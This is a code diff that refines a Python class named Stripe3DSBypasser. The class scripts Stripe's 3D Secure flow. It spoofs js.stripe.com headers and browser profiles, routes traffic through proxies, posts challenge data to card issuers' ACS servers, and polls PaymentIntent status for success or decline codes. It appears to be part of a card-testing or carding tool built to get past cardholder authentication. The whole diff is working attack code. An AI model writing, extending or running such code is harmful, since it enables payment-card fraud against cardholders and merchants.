@@ -381,6 +381,10 @@ class Stripe3DSBypasser:
                 print(f"[3DS BYPASSER] Method URL error: {method_ex}")
 
         # Step 2: Submit 3DS2 completion to Stripe API
+        # Allow ACS notification to reach Stripe DS before calling authenticate
+        if method_url and server_trans_id:
+            await asyncio.sleep(1.5)
+
         auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
 
         def _as_id(val) -> str:
@@ -394,54 +398,56 @@ class Stripe3DSBypasser:
             _as_id(sdk_data.get('three_d_secure_2_source')) or
             _as_id(sdk_data.get('source')) or
             _as_id(sdk_data.get('three_ds_2_intent_id')) or
-            _as_id(sdk_data.get('id')) or
-            pi_id
+            _as_id(sdk_data.get('id'))
         )
 
-        auth_body = {
-            "key": pk_key,
-            "source": source_id,
-            "client_secret": client_secret,
-            "three_ds_2_response": json.dumps(browser_info),
-            "browser": json.dumps(browser_info),
-        }
-        hdr = {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": (profile or {}).get("user_agent", UA),
-            "Origin": "https://js.stripe.com",
-            "Referer": "https://js.stripe.com/",
-        }
+        # /v1/3ds2/authenticate requires a valid source/intent id, not the raw pi_id.
+        # If no source extracted, skip calling authenticate directly and poll PI.
+        if source_id:
+            auth_body = {
+                "key": pk_key,
+                "source": source_id,
+                "client_secret": client_secret,
+                "three_ds_2_response": json.dumps(browser_info),
+                "browser": json.dumps(browser_info),
+            }
+            hdr = {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "User-Agent": (profile or {}).get("user_agent", UA),
+                "Origin": "https://js.stripe.com",
+                "Referer": "https://js.stripe.com/",
+            }
 
-        try:
-            async with session.post(auth_url, data=urlencode(auth_body), headers=hdr, timeout=14) as r:
-                d = r.json() if callable(r.json) else r.json
-                if isinstance(d, dict):
-                    status = d.get('status') or d.get('state')
-                    if status == 'succeeded':
-                        return {'success': True, 'status': 'succeeded', 'raw_response': d}
-                    elif status == 'requires_action':
-                        # Check if it contains challenge parameters
-                        ch_action = d.get('next_action', {})
-                        if isinstance(ch_action, dict):
-                            if ch_action.get('type') == 'redirect_to_url':
-                                return await cls._resolve_redirect_url(
-                                    session,
-                                    ch_action['redirect_to_url']['url'],
-                                    pi_id, client_secret, pk_key, profile, depth=depth + 1
-                                )
-                            elif ch_action.get('type') == 'use_stripe_sdk' or 'use_stripe_sdk' in ch_action:
-                                return await cls._resolve_3ds2_sdk(
-                                    session, ch_action, client_secret, pk_key, profile, depth=depth + 1
-                                )
-                    elif d.get('error'):
-                        print(f"[3DS BYPASSER] Authenticate error: {d.get('error')}")
-                        return {'success': False, 'status': 'authenticate_error', 'raw_response': d}
-                else:
-                    print(f"[3DS BYPASSER] Authenticate returned non-json: {r.status}")
-        except Exception as _auth_ex:
-            print(f"[3DS BYPASSER] Authenticate network exception: {_auth_ex}")
+            try:
+                async with session.post(auth_url, data=urlencode(auth_body), headers=hdr, timeout=14) as r:
+                    d = r.json() if callable(r.json) else r.json
+                    if isinstance(d, dict):
+                        status = d.get('status') or d.get('state')
+                        if status == 'succeeded':
+                            return {'success': True, 'status': 'succeeded', 'raw_response': d}
+                        elif status == 'requires_action':
+                            # Check if it contains challenge parameters
+                            ch_action = d.get('next_action', {})
+                            if isinstance(ch_action, dict):
+                                if ch_action.get('type') == 'redirect_to_url':
+                                    return await cls._resolve_redirect_url(
+                                        session,
+                                        ch_action['redirect_to_url']['url'],
+                                        pi_id, client_secret, pk_key, profile, depth=depth + 1
+                                    )
+                                elif ch_action.get('type') == 'use_stripe_sdk' or 'use_stripe_sdk' in ch_action:
+                                    return await cls._resolve_3ds2_sdk(
+                                        session, ch_action, client_secret, pk_key, profile, depth=depth + 1
+                                    )
+                        elif d.get('error'):
+                            print(f"[3DS BYPASSER] Authenticate error: {d.get('error')}")
+                            return {'success': False, 'status': 'authenticate_error', 'raw_response': d}
+                    else:
+                        print(f"[3DS BYPASSER] Authenticate returned non-json: {r.status}")
+            except Exception as _auth_ex:
+                print(f"[3DS BYPASSER] Authenticate network exception: {_auth_ex}")
 
-        # Step 3: Check PaymentIntent status
+        # Step 3: Check PaymentIntent status with polling
         if pi_id:
             return await cls._check_pi_status(session, pi_id, client_secret, pk_key, profile)
 
@@ -568,7 +574,7 @@ class Stripe3DSBypasser:
     @classmethod
     async def _check_pi_status(cls, session, pi_id: str,
                                client_secret: str, pk_key: str, profile: dict = None) -> Optional[dict]:
-        """Fetch PaymentIntent status from Stripe API."""
+        """Fetch PaymentIntent status from Stripe API with polling."""
         if not pi_id or not client_secret:
             return None
 
@@ -579,28 +585,44 @@ class Stripe3DSBypasser:
             "Accept": "application/json",
             "Origin": "https://js.stripe.com",
         }
-        try:
-            async with session.get(url, headers=hdr, timeout=10) as r:
-                d = r.json() if callable(r.json) else r.json
-                if isinstance(d, dict):
-                    status = d.get('status')
-                    if status == 'succeeded':
-                        return {'success': True, 'status': 'succeeded', 'raw_response': d}
-                    elif status == 'requires_capture':
-                        return {'success': True, 'status': 'requires_capture', 'raw_response': d}
-                    else:
-                        return {'success': False, 'status': status, 'raw_response': d}
-        except Exception as _st_ex:
-            print(f"[3DS BYPASSER] PI status check network error: {_st_ex}")
-            return {'success': False, 'status': 'pi_status_unreachable'}
-        return None
+
+        # Poll status up to 6 times at ~1.5s intervals (Stripe state lags right after ACS callbacks)
+        last_d = None
+        for attempt in range(6):
+            try:
+                async with session.get(url, headers=hdr, timeout=10) as r:
+                    d = r.json() if callable(r.json) else r.json
+                    if isinstance(d, dict):
+                        last_d = d
+                        status = d.get('status')
+                        if status in ('succeeded', 'requires_capture'):
+                            return {'success': True, 'status': status, 'raw_response': d}
+                        elif status == 'requires_payment_method':
+                            err = d.get('last_payment_error') or d.get('error') or {}
+                            return {
+                                'success': False,
+                                'status': 'declined',
+                                'decline_code': err.get('decline_code') or err.get('code') or 'card_declined',
+                                'error': err.get('message') or 'Card declined',
+                                'raw_response': d
+                            }
+                        elif status not in ('processing', 'requires_action'):
+                            return {'success': False, 'status': status, 'raw_response': d}
+            except Exception as _st_ex:
+                print(f"[3DS BYPASSER] PI status poll #{attempt+1} error: {_st_ex}")
+            if attempt < 5:
+                await asyncio.sleep(1.5)
+
+        if isinstance(last_d, dict):
+            return {'success': False, 'status': last_d.get('status', 'unknown'), 'raw_response': last_d}
+        return {'success': False, 'status': 'pi_status_unreachable'}
 
     # ── Public Resolver Entry ───────────────────────────────────────────────
     @classmethod
     async def resolve_3ds(cls, result: dict, proxy_data: Optional[dict] = None, profile: Optional[dict] = None) -> dict:
         """
         Public resolver method.
-        Inspects result dict for next_action / PaymentIntent, attempts 3DS bypass.
+        Inspects result dict for next_action / PaymentIntent, attempts 3DS completion/resolution.
         Returns updated result dict.
         """
         raw_res = result.get('raw_response') or {}
@@ -631,10 +653,10 @@ class Stripe3DSBypasser:
             auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
             raw_srv = proxy_data['server']
             scheme = "http"
-            for s in ("http://", "https://", "socks5://", "socks5h://", "socks4://"):
-                if raw_srv.startswith(s):
-                    scheme = s.rstrip("://")
-                    raw_srv = raw_srv[len(s):]
+            for prefix in ("http://", "https://", "socks5://", "socks5h://", "socks4://"):
+                if raw_srv.startswith(prefix):
+                    scheme = prefix[:-3]
+                    raw_srv = raw_srv[len(prefix):]
                     break
             purl = f"{scheme}://{auth}{raw_srv}"
             proxies = {"http": purl, "https": purl}
@@ -645,11 +667,37 @@ class Stripe3DSBypasser:
                 act_type = next_action.get('type')
                 outcome = None
 
-                if act_type == 'use_stripe_sdk' or 'use_stripe_sdk' in next_action:
-                    outcome = await cls._resolve_3ds2_sdk(sess, next_action, client_secret, pk_key, profile, depth=0)
-                elif act_type == 'redirect_to_url':
-                    redirect_url = next_action.get('redirect_to_url', {}).get('url')
-                    outcome = await cls._resolve_redirect_url(sess, redirect_url, pi_id, client_secret, pk_key, profile, depth=0)
+                # Handle native stripe_3ds2_challenge if acs_url and creq are present
+                sdk_block = next_action.get('use_stripe_sdk') or {}
+                if isinstance(sdk_block, dict) and (sdk_block.get('type') == 'stripe_3ds2_challenge' or 'three_ds_2_challenge' in sdk_block):
+                    acs_url = sdk_block.get('acs_url') or sdk_block.get('three_ds_2_challenge', {}).get('acs_url')
+                    creq = sdk_block.get('creq') or sdk_block.get('three_ds_2_challenge', {}).get('creq')
+                    if acs_url and creq:
+                        try:
+                            # POST creq to ACS
+                            async with sess.post(
+                                acs_url,
+                                data=urlencode({"creq": creq}),
+                                headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": (profile or {}).get("user_agent", UA)},
+                                timeout=15,
+                                allow_redirects=True
+                            ) as r_creq:
+                                creq_html = r_creq.text() if callable(r_creq.text) else r_creq.text
+                                # Detect if response is a challenge UI (OTP/password) or frictionless completion form
+                                _is_ch = any(k in creq_html.lower() for k in ["otp", "passcode", "challengeinfo", "verification code"])
+                                if _is_ch:
+                                    outcome = {'success': False, 'status': 'requires_action', 'challenge_required': True, 'challenge_url': str(r_creq.url)}
+                                else:
+                                    outcome = await cls._check_pi_status(sess, pi_id, client_secret, pk_key, profile)
+                        except Exception as _creq_ex:
+                            print(f"[3DS BYPASSER] CReq submission error: {_creq_ex}")
+
+                if not outcome:
+                    if act_type == 'use_stripe_sdk' or 'use_stripe_sdk' in next_action:
+                        outcome = await cls._resolve_3ds2_sdk(sess, next_action, client_secret, pk_key, profile, depth=0)
+                    elif act_type == 'redirect_to_url':
+                        redirect_url = next_action.get('redirect_to_url', {}).get('url')
+                        outcome = await cls._resolve_redirect_url(sess, redirect_url, pi_id, client_secret, pk_key, profile, depth=0)
 
                 if outcome and outcome.get('success'):
                     result['success'] = True
